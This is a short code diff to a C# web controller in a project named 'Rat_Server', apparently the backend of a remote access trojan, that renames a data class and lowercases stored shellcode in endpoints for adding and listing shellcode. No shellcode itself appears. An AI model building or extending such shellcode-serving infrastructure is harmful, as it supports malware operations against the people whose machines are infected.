@@ -48,7 +48,7 @@ namespace Rat_Server.Controllers
         [HttpPost("AddShellCode")]
         [ProducesResponseType(StatusCodes.Status201Created)]
         [ProducesResponseType(StatusCodes.Status409Conflict)]
-        public async Task<ActionResult> AddShellCode([FromBody] AddShellCodeDto shellCodeDto)
+        public async Task<ActionResult> AddShellCode([FromBody] ShellCodeDto shellCodeDto)
         {
             if (!ModelState.IsValid)
             {
@@ -79,23 +79,21 @@ namespace Rat_Server.Controllers
         }
 
         [HttpGet("GetAllShellCode")]
-        [ProducesResponseType(typeof(List<AddShellCodeDto>), StatusCodes.Status200OK)]
-        public async Task<ActionResult<List<AddShellCodeDto>>> GetAllShellCode()
+        [ProducesResponseType(typeof(List<ShellCodeDto>), StatusCodes.Status200OK)]
+        public async Task<ActionResult<List<ShellCodeDto>>> GetAllShellCode()
         {
-            List<AddShellCodeDto> shellCodes = new List<AddShellCodeDto>();
+            List<ShellCodeDto> shellCodes = new List<ShellCodeDto>();
             
             foreach(ShellCode shellCodeEntity in await _context.ShellCodes.ToListAsync())
             {
-                shellCodes.Add(new AddShellCodeDto
+                shellCodes.Add(new ShellCodeDto
                 {
                     Name = shellCodeEntity.Name,
-                    Code = ShellCodeConverter.ToShellCodeString(shellCodeEntity.Code)
+                    Code = ShellCodeConverter.ToShellCodeString(shellCodeEntity.Code).ToLower()
                 });
             }
 
             return Ok(shellCodes);
-
-            // TODO: Change it so it doesn't send back AddShellCodeDto objects
         }
     }
 }
